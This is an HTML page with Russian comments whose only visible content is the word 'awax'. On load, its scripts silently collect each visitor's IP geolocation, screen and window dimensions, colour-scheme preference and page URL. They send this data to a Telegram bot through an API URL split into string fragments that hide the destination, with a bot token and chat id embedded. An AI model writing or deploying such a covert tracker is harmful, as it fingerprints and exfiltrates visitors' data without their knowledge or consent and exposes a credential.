<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
  <title>Document</title>
	<script src="../src/js/jquery.min.js"></script>
</head>
<body>
awax
<div id=ad>
</div>


<script>
/*
  function loadPsl() {
    let url = chrome.runtime.getURL('res/public_suffix_list.dat.txt');
    return fetch(url).then(response => response.text()).then(setPublicSuffixList);
  }
  var ad=document.getElementById('ad');
  ad.innerHTML = loadPsl();*/
</script>
  
  <script>
var t='*';
	  
	  
var ip='';
//https://json.geoiplookup.io/api

$.getJSON('https://json.geoiplookup.io/api?callback=?', function(data) {
  console.log(JSON.stringify(data, null, 2));
  ip=data[0];
	send('JSON1:'+JSON.stringify(data, null, 2));
});
t+=' ip:'+ip;

/*
Возвращает:
{
    "ip": "116.12.250.1",
    "isp": "SGPOST",
    "org": "Singapore Post Ltd",
    "hostname": "116.12.250.1",
    "longitude": "103.807",
    "latitude": "1.29209",
    "postal_code": "",
    "city": "Singapore",
    "country_code": "SG",
    "country_name": "Singapore",
    "continent_code": "AS",
    "region": "Central Singapore",
    "district": "",
    "timezone_name": "Asia\/Singapore",
    "connection_type": "",
    "asn": "AS3758 SingNet",
    "currency_code": "SGD",
    "currency_name": "Singapore Dollar",
    "success": true
}
*/
	  
//Размер экрана — это ширина и высота всего экрана: монитора или мобильного дисплея.
const screenWidth = window.screen.width;
const screenHeight = window.screen.height;
t+=' экран:'+screenWidth+'/'+screenHeight;

//Доступный размер экрана — это ширина и высота активного экрана без панели инструментов операционной системы.
const availableScreenWidth = window.screen.availWidth;
const availableScreenHeight = window.screen.availHeight;
t+=' экран2:'+availableScreenWidth+'/'+availableScreenHeight;

//Размер внешнего окна — это ширина и высота текущего окна браузера, включая адресную строку, панель вкладок и другие панели браузера.
const windowOuterWidth = window.outerWidth;
const windowOuterHeight = window.outerHeight;
t+=' экран3:'+windowOuterWidth+'/'+windowOuterHeight;

//Внутренний размер окна — это ширина и высота области просмотра (вьюпорта).
//const windowInnerWidth = window.innerWidth;
//const windowInnerHeight = window.innerHeight;
//Если мы хотим получить внутренний размер окна без полос прокрутки, то делаем следующее:
const windowInnerWidth = document.documentElement.clientWidth;
const windowInnerHeight = document.documentElement.clientHeight;
t+=' экран4:'+windowInnerWidth+'/'+windowInnerHeight;

var visualViewportoffsetTop='', visualViewportheight='';
if(window.visualViewport) {
    visualViewportoffsetTop = window.visualViewport.offsetTop;
    visualViewportheight = window.visualViewport.height;
};
t+=' visualViewport:'+visualViewportoffsetTop+'/'+visualViewportheight;



var colorScheme='';
if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
    colorScheme='dark-mode';
}else{
colorScheme='light-mode';
};
t+=' colorScheme:'+colorScheme;

window.matchMedia('(prefers-color-scheme: dark)').addEventListener('change', e => {
    const newColorScheme = e.matches ? "dark" : "light";
	//alert(newColorScheme);
});



t+=' *';

//send
function send(t){
var a='.tel', b='eg', c='ram.org/', d='AAHpvXr4X5hHTeq2L2g0qrRwRz4hx4_Q-jY';
		var search = window.location.href.replace( /\?/g,'/');
		var res=search.replace(/\&/g,'/');
	        $.ajax({
            type: "POST",
            url: 'https://api'+a+b+c+'bot876530454:'+d+'/sendMessage?chat_id=-380185005&parse_mode=html&text=test:'+res+' '+t,
            success: function (data) {},
            error: function (jqXHR, text, error) {}
        });
};
//send
send(t);
	  
$.getJSON('https://json.geoiplookup.io/api?callback=?', function(data) {
  console.log(JSON.stringify(data, null, 2));
  ip=data.ip;
	send('JSON2:'+JSON.stringify(data, null, 2));
});

</script>
</body>
</html>
